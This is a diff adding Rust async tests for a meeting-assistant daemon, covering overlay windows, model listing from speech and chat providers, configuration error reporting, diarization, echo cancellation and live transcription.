+        d.line("import.date  /nowhere/retro.mp4").await;
+        let date = d.until(|event| event["type"] == "import_date").await;
+        assert_eq!(
+            date,
+            json!({"type": "import_date", "path": "/nowhere/retro.mp4", "at": null})
+        );
+    }
+
+    #[tokio::test]
+    async fn opening_the_app_again_opens_a_window_on_a_session_no_window_shows() {
+        let mut d = daemon(raw());
+        let first = d.start("Retro").await;
+        let second = d.start("1:1").await;
+        for _ in 0..3 {
+            let events = d.line("overlay.open").await;
+            assert_eq!(events, [json!({"type": "overlay_status", "open": true})]);
+        }
+        assert_eq!(
+            d.asked(),
+            [
+                format!("open {second} "),
+                format!("open {first} "),
+                "open  ".into()
+            ]
+        );
+        assert!(d.session.overlay_open.load(Ordering::Relaxed));
+        d.desk.lock().unwrap().refuse = true;
+        let events = d.line("overlay.open").await;
+        assert_eq!(
+            events,
+            [
+                json!({"type": "overlay_status", "open": false, "message": "eco-window exited with 1"})
+            ]
+        );
+    }
+
+    #[tokio::test]
+    async fn a_shortcut_goes_to_the_newest_window_or_opens_one_to_make_it() {
+        let mut d = daemon(raw());
+        let events = d
+            .line(r#"window.call {"call": "import", "path": "/tmp/retro.vtt"}"#)
+            .await;
+        assert_eq!(said(&events), ["overlay_status"]);
+        assert_eq!(
+            d.asked(),
+            [r#"open  {"call":"import","path":"/tmp/retro.vtt"}"#]
+        );
+        let events = d.line(r#"window.call {"call": "config"}"#).await;
+        assert_eq!(
+            events,
+            [json!({"type": "window_call", "window": 1, "call": "config"})]
+        );
+        assert!(d.line(r#"window.call {"call": "focus"}"#).await.is_empty());
+        // A window that cannot take the keyboard is still asked.
+        d.desk.lock().unwrap().refuse = true;
+        let events = d.line(r#"window.call {"call": "sessions"}"#).await;
+        assert_eq!(
+            events,
+            [json!({"type": "window_call", "window": 1, "call": "sessions"})]
+        );
+        assert_eq!(d.asked()[1..], ["focus 1", "focus 1", "focus 1"]);
+        let events = d.line(r#"window.call {"call": "quit"}"#).await;
+        assert_eq!(said(&events), ["command.unknown"]);
+    }
+
+    #[tokio::test]
+    async fn a_window_says_what_it_shows_and_that_session_is_addressed() {
+        let mut d = daemon(raw());
+        let first = d.start("Retro").await;
+        let second = d.start("1:1").await;
+        d.line("overlay.open").await;
+        let events = d
+            .line(&format!(
+                r#"window.show {{"window": 1, "session": "{first}"}}"#
+            ))
+            .await;
+        assert_eq!(events[0]["session"]["id"], first);
+        assert_eq!(d.desk.lock().unwrap().open, [(1, first.clone())]);
+        let events = d.line(r#"window.show {"window": 1, "session": ""}"#).await;
+        assert!(events.is_empty());
+        assert_eq!(d.desk.lock().unwrap().open, [(1, String::new())]);
+        assert!(d.line("window.show 1").await.is_empty());
+        // The next window opens on the session the first stopped showing.
+        d.line("overlay.open").await;
+        assert_eq!(d.asked().last().unwrap(), &format!("open {first} "));
+        assert_ne!(first, second);
+    }
+
+    #[tokio::test]
+    async fn the_daemon_greets_a_client_with_what_it_needs_first() {
+        let d = daemon(raw());
+        d.session.overlay_open.store(true, Ordering::Relaxed);
+        let greeting = greeting(
+            d.session.assistant.clone(),
+            Arc::clone(&d.session.overlay_open),
+            Outages::default(),
+            Arc::clone(&d.session.pending),
+        );
+        let events = greeting();
+        assert_eq!(said(&events), ["daemon", "snapshot"]);
+        assert_eq!(events[0]["overlay"], true);
+        assert_eq!(events[0]["version"], env!("CARGO_PKG_VERSION"));
+        let held = hold(&mut d.session.pending.lock().unwrap(), "notify-send done");
+        assert_eq!(greeting()[2], held);
+    }
+
+    #[tokio::test]
+    async fn stop_ends_the_daemon_and_closes_its_windows() {
+        let Daemon {
+            session,
+            desk,
+            exits,
+            ..
+        } = daemon(raw());
+        let open = Arc::clone(&session.overlay_open);
+        let (lines, received) = mpsc::unbounded_channel();
+        let served = tokio::spawn(session.serve(received, std::future::pending()));
+        lines.send("overlay.open".into()).unwrap();
+        let opened = || open.load(Ordering::Relaxed);
+        eventually(opened).await;
+        // A window that exits is no longer open.
+        exits
+            .send(std::os::unix::process::ExitStatusExt::from_raw(256))
+            .unwrap();
+        eventually(|| !opened()).await;
+        lines.send("stop".into()).unwrap();
+        served.await.unwrap();
+        assert_eq!(desk.lock().unwrap().asked, ["open  ", "close"]);
+    }
+
+    #[tokio::test]
+    async fn a_signal_stops_capture_and_the_import() {
+        let mut d = daemon(raw());
+        d.configured().await;
+        let import = tokio::spawn(std::future::pending());
+        d.session.importing = Some(import);
+        let (_lines, received) = mpsc::unbounded_channel();
+        d.session.serve(received, async {}).await;
+        assert_eq!(d.desk.lock().unwrap().asked, ["close"]);
+    }
+
+    /// Wait until `done`.
+    async fn eventually(done: impl Fn() -> bool) {
+        let deadline = std::time::Instant::now() + Duration::from_secs(20);
+        while !done() {
+            assert!(std::time::Instant::now() < deadline, "never done");
+            tokio::time::sleep(Duration::from_millis(5)).await;
+        }
+    }
+
+    #[tokio::test]
+    async fn models_list_what_a_provider_offers() {
+        let listed = br#"{"data": [{"id": "m2"}, {"id": "m1"}]}"#.to_vec();
+        let (base, seen) = http::testing::serve_once(200, listed).await;
+        let request = json!({"target": "llm", "base_url": base});
+        let answer = models(&request.to_string(), &[]).await;
+        assert_eq!(
+            answer,
+            json!({"type": "models", "target": "llm", "models": ["m1", "m2"]})
+        );
+        assert!(seen.lock().unwrap().head.starts_with("GET /v1/models "));
+        // Deepgram says which of its models stream.
+        let listed = br#"{"stt": [{"canonical_name": "nova-3", "streaming": true},
+                                  {"canonical_name": "whisper", "streaming": false}]}"#;
+        let (base, seen) = http::testing::serve_once(200, listed.to_vec()).await;
+        let deepgram = base.replace("http://", "ws://") + "/deepgram.com/listen";
+        let request = json!({"target": "stt", "base_url": deepgram});
+        let answer = models(&request.to_string(), &[]).await;
+        assert_eq!(answer["models"], json!(["nova-3"]));
+        assert!(
+            seen.lock()
+                .unwrap()
+                .head
+                .starts_with("GET /v1/deepgram.com/models ")
+        );
+        // ElevenLabs lists none: its models are known.
+        let request = json!({"target": "stt", "base_url": "wss://api.elevenlabs.io/v1/speech-to-text/realtime"});
+        let answer = models(&request.to_string(), &[]).await;
+        assert_eq!(answer["models"], json!(stt_elevenlabs::MODELS));
+    }
+
+    #[tokio::test]
+    async fn models_say_why_they_cannot_be_listed() {
+        let request = json!({"base_url": "http://10.0.0.5:8000/v1"});
+        let answer = models(&request.to_string(), &[]).await;
+        assert_eq!(answer["error"], "missing target");
+        assert_eq!(answer["target"], "");
+        let request = json!({"target": "llm", "base_url": "http://10.0.0.5:8000/v1", "api_key_env": "LAN_KEY"});
+        let answer = models(&request.to_string(), &saved_models()).await;
+        assert_eq!(answer["error"], "LAN_KEY is not set");
+        let mut d = daemon(raw());
+        d.line(&format!("models {}", json!({"target": "chat"})))
+            .await;
+        let answer = d.until(|event| event["type"] == "models").await;
+        assert_eq!(answer["error"], "missing base_url");
+    }
+
+    #[tokio::test]
+    async fn every_kind_of_transcription_model_is_built_for_live_audio_or_a_file() {
+        let model = |base_url: &str, key: Option<&str>| -> ModelConfig {
+            serde_json::from_value(json!({"name": "t", "type": "transcription",
+                "base_url": base_url, "model": "x", "api_key_env": key}))
+            .unwrap()
+        };
+        let built = |stt: Result<Stt, String>| match stt {
+            Ok(Stt::Segments(_)) => "segments".to_string(),
+            Ok(Stt::Stream(_)) => "stream".to_string(),
+            Err(reason) => reason,
+        };
+        let deepgram = model("wss://api.deepgram.com/v1/listen", None);
+        let cases = [
+            (
+                model("https://api.groq.com/openai/v1/", None),
+                false,
+                "segments",
+            ),
+            (deepgram.clone(), false, "stream"),
+            (deepgram, true, "segments"),
+            (
+                model("wss://api.elevenlabs.io/v1/speech-to-text/realtime", None),
+                true,
+                "stream",
+            ),
+            (
+                model("ws://lan:9000", None),
+                false,
+                "no streaming transcription known at ws://lan:9000",
+            ),
+            (
+                model("http://lan", Some("ECO_TEST_UNSET_KEY")),
+                false,
+                "ECO_TEST_UNSET_KEY is not set",
+            ),
+        ];
+        for (stt, file, expected) in cases {
+            assert_eq!(
+                built(Stt::build(&stt, "pt", file).await),
+                expected,
+                "{}",
+                stt.base_url
+            );
+        }
+    }
+
+    #[tokio::test]
+    async fn the_setup_tells_each_part_that_cannot_be_had_and_the_rest_works() {
+        let mut raw = raw();
+        raw["models"] = json!([
+            {"name": "w", "type": "transcription", "base_url": "ws://127.0.0.1:1/listen", "model": "x"},
+            {"name": "m", "type": "chat", "base_url": "http://127.0.0.1:1/v1", "model": "m",
+             "api_key_env": "ECO_TEST_UNSET_KEY"},
+        ]);
+        raw["context"] = json!({"files": ["/nowhere/eco/cv.md"]});
+        raw["contexts"] = json!([{"name": "notes", "files": ["/nowhere/eco/notes.md"]}]);
+        let mut d = daemon(raw);
+        d.configured().await;
+        let problems = d.events.lock().unwrap().clone();
+        assert_eq!(
+            said(&problems),
+            [
+                "input.disconnected",
+                "snapshot",
+                "stt.unavailable",
+                "model.unavailable",
+                "context.unavailable",
+                "context.unavailable"
+            ]
+        );
+        let detail = "w: no streaming transcription known at ws://127.0.0.1:1/listen";
+        assert_eq!(problems[2]["params"]["detail"], detail);
+        assert_eq!(
+            problems[3]["params"],
+            json!({"name": "m", "detail": "ECO_TEST_UNSET_KEY is not set"})
+        );
+        assert!(
+            problems[5]["message"]
+                .as_str()
+                .unwrap()
+                .starts_with("context notes: ")
+        );
+        // A session still starts and is listed with what it would be transcribed by.
+        let id = d.start("Retro").await;
+        let events = d.line(&format!("session.show {id}")).await;
+        assert_eq!(said(&events), ["session_detail"]);
+    }
+
+    #[tokio::test]
+    async fn each_kind_runs_on_its_models() {
+        let mut raw = raw();
+        let models = raw["models"].as_array_mut().unwrap();
+        models.push(json!({"name": "dg", "type": "transcription", "base_url": "wss://api.deepgram.com/v1/listen",
+                           "model": "nova-3", "api_key_env": "CARGO_PKG_NAME", "kinds": ["idea"]}));
+        models.push(
+            json!({"name": "fast", "type": "chat", "base_url": "http://127.0.0.1:1/v1",
+                           "model": "f", "kinds": ["idea"], "translates": ["idea"]}),
+        );
+        raw["reviewer"] = json!({"enabled": true, "model": "fast"});
+        raw["actions"] = json!([{"name": "probe", "prompt": "p", "format": "f", "model": "fast"}]);
+        let mut d = daemon(raw);
+        let snapshot = d.configured().await;
+        assert_eq!(
+            snapshot["kind_models"],
+            json!({
+                "meeting": {"transcription": "w", "chat": "m"},
+                "conversation": {"transcription": "w", "chat": "m"},
+                "other": {"transcription": "w", "chat": "m"},
+                "idea": {"transcription": "dg", "chat": "fast"},
+            })
+        );
+        assert_eq!(snapshot["actions"], json!(["probe"]));
+    }
+
+    #[tokio::test]
+    async fn a_question_is_answered_by_the_configured_model() {
+        let delta = json!({"choices": [{"delta": {"content": "Kafka."}}]});
+        let reply = format!("data: {delta}\n\ndata: [DONE]\n\n");
+        let (base, seen) =
+            http::testing::serve_once_as(200, Some("text/event-stream"), reply.into_bytes()).await;
+        let mut raw = raw();
+        raw["models"][1]["base_url"] = json!(base);
+        let mut d = daemon(raw);
+        d.configured().await;
+        d.start("Retro").await;
+        d.line("ask which queue?").await;
+        let done = d.until(|event| event["type"] == "suggestion_end").await;
+        let answer = d.until(|event| event["type"] == "suggestion_delta").await;
+        assert_eq!(
+            (&answer["id"], &answer["text"]),
+            (&done["id"], &json!("Kafka."))
+        );
+        assert!(
+            seen.lock()
+                .unwrap()
+                .head
+                .starts_with("POST /v1/chat/completions ")
+        );
+        // The setup offers its languages; a session moves to one of them.
+        let id = d.start("1:1").await;
+        let events = d
+            .line(&format!(
+                r#"session.language {{"id": "{id}", "language": "EN"}}"#
+            ))
+            .await;
+        assert_eq!(events[0]["session"]["language"], "en");
+        let line = format!(r#"session.translation {{"id": "{id}", "language": " pt"}}"#);
+        let events = d.line(&line).await;
+        assert_eq!(events.last().unwrap()["translating"], "pt");
+        let line =
+            format!(r#"entry.translate {{"session": "{id}", "id": "e1", "language": " pt"}}"#);
+        let events = d.line(&line).await;
+        assert_eq!(said(&events), ["answer.not_found"]);
+    }
+
+    #[tokio::test]
+    async fn a_replay_that_cannot_be_read_is_reported() {
+        let mut d = daemon(raw());
+        d.session.rig.replay = Some(d.dir.path().join("call.wav"));
+        let snapshot = d.configured().await;
+        assert_eq!(snapshot["inputs"][0]["label"], "call.wav");
+        let stopped = d.until(|event| event["code"] == "capture.stopped").await;
+        assert!(
+            stopped["message"].as_str().unwrap().contains("call.wav"),
+            "{stopped}"
+        );
+    }
+
+    /// A diarizer that counts the regions it is sent, then finds `found`.
+    fn diarizer(regions: Arc<Mutex<usize>>, found: Result<Diarization, String>) -> Diarizer {
+        let found = Mutex::new(Some(found));
+        Arc::new(move |tell: Found| {
+            let (sender, received) = std::sync::mpsc::channel::<Segment>();
+            let regions = Arc::clone(&regions);
+            let found = found.lock().unwrap().take().expect("one diarizer");
+            std::thread::spawn(move || {
+                *regions.lock().unwrap() = received.iter().count();
+                tell(found);
+            });
+            Some(sender)
+        })
+    }
+
+    #[tokio::test]
+    async fn a_recording_cancels_echo_and_tells_the_voices_of_the_others_apart() {
+        let mut raw = raw();
+        raw["audio"] = json!({"echo_cancel": true});
+        raw["models"][0]["base_url"] = json!("ws://127.0.0.1:1/listen");
+        let audio = Arc::new(FakeAudio {
+            speech: true,
+            ..FakeAudio::default()
+        });
+        let regions = Arc::new(Mutex::new(0));
+        let found = Err("the diarizer exited".to_string());
+        let audio_seen = Arc::clone(&audio);
+        let mut d = daemon_on(raw, audio, diarizer(Arc::clone(&regions), found));
+        // Recording from the start, so the clips are heard by the capture.
+        d.start("Retro").await;
+        d.configured().await;
+        let failed = d.until(|event| event["code"] == "diarization.failed").await;
+        assert_eq!(failed["params"]["detail"], "the diarizer exited");
+        assert!(*regions.lock().unwrap() > 0);
+        assert_eq!(
+            *audio_seen.captured.lock().unwrap(),
+            [
+                "cancelled",
+                "@default-input",
+                "@default-output",
+                "echo @default-input"
+            ]
+        );
+        d.until(|event| event["type"] == "signal" && event["input"] == "@default-output")
+            .await;
+    }
+
+    #[tokio::test]
+    async fn a_microphone_whose_echo_cannot_be_cancelled_is_heard_as_it_is() {
+        let mut raw = raw();
+        raw["audio"] = json!({"echo_cancel": true});
+        let audio = Arc::new(FakeAudio {
+            echo_fails: true,
+            ..FakeAudio::default()
+        });
+        let mut d = daemon_on(raw, audio, no_diarizer());
+        d.start("Retro").await;
+        d.configured().await;
+        let failed = d.until(|event| event["code"] == "echo_cancel.failed").await;
+        assert_eq!(failed["params"]["detail"], "no echo-cancel module");
+    }
+
+    /// Hears `words` in every clip, billed under the request "r1".
+    struct Says(&'static str);
+
+    impl SpeechToText for Says {
+        fn transcribe<'a>(
+            &'a self,
+            pcm: &'a [i16],
+        ) -> BoxFuture<'a, Result<crate::ports::Transcript, TranscriptionError>> {
+            let end = pcm.len() as f64 / 16_000.0;
+            let phrases = vec![crate::ports::Phrase {
+                start: 0.0,
+                end,
+                text: self.0.into(),
+            }];
+            let request = Some("r1".to_string());
+            Box::pin(async move { Ok(crate::ports::Transcript { phrases, request }) })
+        }
+    }
+
+    /// Streams the request "r2", a partial, then a phrase, once a frame comes.
+    struct Streams;
+
+    impl StreamingSpeechToText for Streams {
+        fn transcribe<'a>(
+            &'a self,
+            frames: stream::BoxStream<'a, Frame>,
+        ) -> stream::BoxStream<'a, Result<Heard, TranscriptionError>> {
+            let phrase = crate::ports::Phrase {
+                start: 0.0,
+                end: 1.0,
+                text: "bom dia".into(),
+            };
+            let heard = [
+                Heard::Request("r2".into()),
+                Heard::Partial("bom".into()),
+                Heard::Phrase(phrase),
+            ];
+            frames
+                .take(1)
+                .flat_map(move |_| stream::iter(heard.clone().map(Ok)))
+                .boxed()
+        }
+    }
+
+    /// One second of speech captured at the start of the input.
+    fn segment() -> Captured {
+        let segment = Segment {
+            pcm: vec![0; 16_000],
+            start: 0,
+        };
+        Captured::Segment(segment, tokio::time::Instant::now())
+    }
+
+    #[tokio::test]
+    async fn what_a_transcriber_hears_goes_to_the_sessions_listening() {
+        let mut d = daemon(raw());
+        d.configured().await;
+        let id = d.start("Retro").await;
+        let (assistant, emit) = (d.session.assistant.clone(), Arc::clone(&d.session.emit));
+        let outages = Outages::default();
+        let (capture, _segments) = transcribing(
+            Stt::Segments(Box::new(Says("olá"))),
+            &assistant,
+            &emit,
+            &outages,
+        );
+        capture.send(segment());
+        let line = d.until(|event| event["type"] == "transcript").await;
+        assert_eq!(
+            (&line["session"], &line["who"], &line["text"]),
+            (&json!(id), &json!("Eles"), &json!("olá"))
+        );
+        let (capture, _streamed) =
+            transcribing(Stt::Stream(Box::new(Streams)), &assistant, &emit, &outages);
+        capture.send(Captured::Frame(0, vec![0; FRAME_SAMPLES]));
+        let partial = d.until(|event| event["type"] == "transcript_partial").await;
+        assert_eq!(
+            (&partial["session"], &partial["text"]),
+            (&json!(id), &json!("bom"))
+        );
+        d.until(|event| event["text"] == "bom dia").await;
+    }
+
+    #[tokio::test]
+    async fn the_lines_a_live_input_became_get_the_voices_found() {
+        let mut d = daemon(raw());
+        d.configured().await;
+        let id = d.start("Retro").await;
+        let (assistant, emit) = (d.session.assistant.clone(), Arc::clone(&d.session.emit));
+        let regions = Arc::new(Mutex::new(0));
+        let found = Diarization {
+            turns: vec![crate::domain::diarization::Turn {
+                start: 0.0,
+                end: 60.0,
+                speaker: 0,
+            }],
+            voices: vec![vec![1.0; 4]],
+        };
+        let diarizer = diarizer(Arc::clone(&regions), Ok(found));
+        let voices = voices(&assistant, &emit, "Eles", &diarizer).unwrap();
+        let mut hub = Hub::default();
+        let capture = hub.input("mic");
+        let cell: Ready = Arc::new(OnceCell::new_with(Some(Ok(Stt::Segments(Box::new(Says(
+            "olá",
+        )))))));
+        let listening = Listening {
+            model: "w".into(),
+            language: "pt".into(),
+        };
+        let heard = tokio::spawn(transcriber(
+            "Eles".into(),
+            hub.read("mic").unwrap(),
+            (Arc::default(), cell),
+            listening,
+            assistant,
+            (emit, Outages::default()),
+            Some(Arc::clone(&voices.lines)),
+        ));
+        voices
+            .regions
+            .send(Segment {
+                pcm: vec![0; 16_000],
+                start: 0,
+            })
+            .unwrap();
+        capture.send(segment());
+        drop(capture);
+        heard.await.unwrap();
+        assert_eq!(voices.lines.lock().unwrap().len(), 1);
+        drop(voices);
+        let diarized = d.until(|event| event["type"] == "diarized").await;
+        assert_eq!(
+            (&diarized["session"], &diarized["who"]),
+            (&json!(id), &json!(["Eles"]))
+        );
+        assert_eq!(*regions.lock().unwrap(), 1);
+    }
+
+    #[test]
+    fn speech_lost_is_told_but_not_kept_for_later_clients() {
+        let outages = Outages::default();
+        let event = outages.note("Eles", &Trouble::Failed("timed out".into()));
+        assert_eq!(event["code"], "transcription.failed");
+        assert_eq!(outages.events(), [] as [Value; 0]);
+    }
+
+    #[tokio::test]
+    async fn a_model_that_is_not_registered_is_told_and_nothing_is_transcribed() {
+        let dir = tempfile::tempdir().unwrap();
+        let (emit, events) = recorder();
+        let assistant = assistant(&emit, dir.path());
+        let mut hub = Hub::default();
+        let _capture = hub.input("mic");
+        let listening = Listening {
+            model: "gone".into(),
+            language: "pt".into(),
+        };
+        transcriber(
+            "Eles".into(),
+            hub.read("mic").unwrap(),
+            (Arc::default(), Ready::default()),
+            listening,
+            assistant,
+            (emit, Outages::default()),
+            None,
+        )
+        .await;
+        let reason = "gone: not a registered transcription model";
+        assert_eq!(
+            *events.lock().unwrap(),
+            [error(
+                "stt.unavailable",
+                format!("transcription: {reason}"),
+                json!({"detail": reason})
+            )]
+        );
+    }
+
+    /// A source that never ends.
+    struct Endless;
+
+    impl AudioSource for Endless {
+        fn frames(&mut self) -> stream::BoxStream<'_, Result<Frame, AudioError>> {
+            stream::pending().boxed()
+        }
+    }
+
+    #[tokio::test(start_paused = true)]
+    async fn a_recording_capture_follows_the_sessions_until_none_can_record() {
+        let dir = tempfile::tempdir().unwrap();
+        let (emit, events) = recorder();
+        let mic = Input {
+            id: "mic".into(),
+            label: "Mic".into(),
+            participant: "Eu".into(),
+            user: true,
+            color: None,
+            source: Box::new(Endless),
+            cancelled: None,
+        };
+        let mut channels = Channels {
+            inputs: vec![mic],
+            audio: Arc::new(FakeAudio::default()),
+            models: Arc::default(),
+            built: Built::default(),
+            assistant: assistant(&emit, dir.path()),
+            emit,
+            vad: vad(),
+            diarizer: no_diarizer(),
+            outages: Outages::default(),
+        };
+        let (recording, listening) = watch::channel(BTreeSet::new());
+        let sessions = async {
+            tokio::time::sleep(Duration::from_millis(10)).await;
+            // A session starts listening with a model no one registered.
+            recording.send_replace(self::listening(&["gone"]));
+            tokio::time::sleep(Duration::from_millis(10)).await;
+            drop(recording);
+        };
+        let (ran, ()) = tokio::join!(channels.run(Some(listening)), sessions);
+        assert!(ran.is_ok());
+        let unavailable = events.lock().unwrap()[0]["code"].clone();
+        assert_eq!(unavailable, "stt.unavailable");
     }
 }
